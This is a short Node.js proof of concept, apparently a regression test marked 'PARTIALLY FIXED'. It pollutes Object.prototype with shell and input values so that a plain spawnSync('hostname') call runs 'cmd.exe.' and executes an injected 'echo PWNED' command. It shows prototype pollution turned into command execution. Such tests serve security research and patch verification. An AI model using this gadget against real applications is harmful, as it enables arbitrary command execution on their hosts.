// PARTIALLY FIXED

const { spawnSync } = require('child_process');

Object.prototype.shell = 'cmd.exe.';
Object.prototype.input = 'echo PWNED\n';

const cp = spawnSync('hostname', {});
console.log(cp.output.toString());
